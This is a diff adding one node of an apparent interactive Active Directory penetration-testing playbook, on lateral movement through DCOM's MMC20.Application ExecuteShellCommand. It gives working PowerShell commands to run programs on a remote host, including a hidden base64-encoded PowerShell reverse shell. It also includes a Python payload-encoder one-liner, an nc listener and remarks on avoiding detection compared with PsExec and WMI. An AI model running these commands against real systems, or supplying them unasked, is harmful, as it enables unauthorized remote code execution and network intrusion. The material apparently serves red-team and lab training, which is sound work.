@@ -1,0 +1,38 @@
+{
+  "id": "dcom_lateral",
+  "phase": "AD",
+  "title": "DCOM Lateral Movement — MMC20.Application ExecuteShellCommand",
+  "body": "DCOM (Distributed COM) lets COM objects be instantiated across the network over RPC/135. The Microsoft Management Console object — MMC20.Application — exposes an ExecuteShellCommand method under Document.ActiveView that runs arbitrary shell commands on the remote host, by default available to local admins. It's a quieter lateral-movement path than PsExec because it creates NO service.\n\nWHY IT'S USEFUL:\n  - No service creation (unlike PsExec) — far less noisy, no Event 7045\n  - Native — uses built-in COM, no tool to drop\n  - Runs from an elevated PowerShell on your foothold against any host where you're local admin\n  - Discovered/popularized by Matt Nelson (enigma0x3); Cybereason catalogued the DCOM family\n\nHOW IT WORKS:\n  You instantiate MMC20.Application remotely by passing the target IP as the second arg to GetTypeFromProgID. That returns a remote COM object. Then you call its Document.ActiveView.ExecuteShellCommand with four params (Command, Directory, Parameters, WindowState) — you only care about Command and Parameters.\n\nSESSION 0:\n  Like WMI, processes spawn in Session 0 (service isolation). You won't see a GUI on the target; verify with tasklist or just catch your reverse shell.\n\nREQUIREMENTS:\n  - Elevated PowerShell on the foothold\n  - Local admin on the target (DCOM SCM requires it)\n  - TCP 135 reachable (+ the dynamic RPC range)\n\nLike WMI's Win32_Process.Create, ExecuteShellCommand is fire-and-forget — pair it with an encoded reverse shell and catch the callback. Same payload you'd build for the WMI technique.",
+  "cmd": "# ══════════════════════════════════════════════════\n# From an ELEVATED PowerShell on your Windows foothold (as a local admin on target)\n# ══════════════════════════════════════════════════\n\n# 1) Instantiate MMC20.Application on the remote host (target IP as 2nd arg)\n$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"192.168.50.73\"))\n\n# 2) Proof-of-concept — pop calc on the target\n$dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c calc\",\"7\")\n#   params: Command, Directory(null), Parameters, WindowState(\"7\")\n\n# Verify on target (calc runs in Session 0):\n#   tasklist | findstr calc   ->   win32calc.exe ... Services 0\n\n# ══════════════════════════════════════════════════\n# FULL REVERSE SHELL\n# ══════════════════════════════════════════════════\n# Build the base64 (UTF-16LE) PowerShell reverse shell on Kali first (same encoder\n# as the WMI technique), start your listener, then:\n\n$dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",$null,\"powershell -nop -w hidden -e <BASE64_REVSHELL>\",\"7\")\n\n# Encoder (Kali) — UTF-16LE then base64, strip BOM:\n#   python3 -c \"import base64;p=open('shell.ps1','rb').read();print('powershell -nop -w hidden -e '+base64.b64encode(p.decode().encode('utf16')[2:]).decode())\"\n\n# Listener (Kali):\n#   nc -lnvp 443\n# Callback arrives from the TARGET as the user whose creds your foothold session holds.\n\n# ══════════════════════════════════════════════════\n# WHY PICK DCOM OVER THE OTHERS\n# ══════════════════════════════════════════════════\n# PsExec   -> interactive + output, but creates a SERVICE (Event 7045, loud)\n# WMI      -> no service, fire-and-forget, very common technique (well-signatured)\n# DCOM/MMC -> no service, less commonly monitored, but needs elevated PS + admin on target\n# WinRM    -> clean but needs 5985/5986 open and Remote Management Users membership\n# Pick based on what ports are open and how much noise you can afford.",
+  "warn": "ExecuteShellCommand is fire-and-forget — it returns nothing useful, so pair it with a reverse shell and have your listener up first. Requires an ELEVATED PowerShell on the foothold and local admin on the target; a non-elevated prompt will fail to instantiate the remote object.",
+  "choices": [
+    {
+      "label": "Need the reverse shell payload / listener",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "Prefer WMI (also no service)",
+      "next": "wmi_cim_lateral"
+    },
+    {
+      "label": "Want an interactive shell instead — PsExec",
+      "next": "psexec_lateral"
+    },
+    {
+      "label": "WinRM is open — use that",
+      "next": "winrm_access"
+    },
+    {
+      "label": "Got a shell — re-enumerate as the new context",
+      "next": "bloodhound_authenticated"
+    },
+    {
+      "label": "Back to lateral movement overview",
+      "next": "lateral_movement"
+    },
+    {
+      "label": "Back to jump menu",
+      "next": "jump_menu"
+    }
+  ]
+}
